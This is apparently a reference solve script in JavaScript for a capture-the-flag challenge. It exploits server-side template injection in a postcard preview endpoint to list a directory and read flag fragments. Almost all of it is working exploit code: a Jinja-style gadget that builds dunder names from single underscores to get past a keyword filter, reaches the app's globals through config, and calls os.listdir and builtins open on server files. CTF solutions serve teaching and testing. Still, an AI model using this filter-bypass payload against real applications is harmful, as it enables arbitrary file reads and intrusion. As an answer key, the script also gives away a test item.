// Reference solve — Postcard, Templar. The press refuses raw `__` and the words os/popen/import/subprocess/eval/exec,
// then still renders the message as a template. The flag is no longer at /tmp/postcard/flag.txt: it is torn into a
// random pair under /tmp/postcard/outbox, beside decoy pairs. Build every dunder from single underscores and the
// path from pieces (so the raw message spells no blocked token), list the outbox, then join each candidate pair and
// keep the only one that forms a valid HVWA{...}. Implementer-supplied; the plan hard-codes no payload by design.
const base = process.argv[2];

const GADGET = "{% set d='_'~'_' %}{% set g=config|attr(d~'cla'~'ss'~d)|attr(d~'ini'~'t'~d)|attr(d~'glo'~'bals'~d) %}";
const OUTBOX = "{% set p='/tmp/p'~'o'~'stcard/outbox/' %}";
const LIST = `${GADGET}${OUTBOX}{{ g['o'~'s'].listdir(p)|join(',') }}`;
const pair = (token) => `${GADGET}${OUTBOX}{{ g[d~'builtins'~d].open(p~'part-1-${token}').read() }}{{ g[d~'builtins'~d].open(p~'part-2-${token}').read() }}`;

async function preview(message) {
  const res = await fetch(`${base}/preview`, {
    method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ style: 'Birthday', message }),
  });
  return res.text();
}

const listing = await preview(LIST);
const tokens = [...new Set([...listing.matchAll(/part-[12]-([a-f0-9]{8})/g)].map((m) => m[1]))];
for (const token of tokens) {
  const m = (await preview(pair(token))).match(/HVWA\{[a-z2-7]{26}\}/);
  if (m) { console.log(m[0]); break; }
}
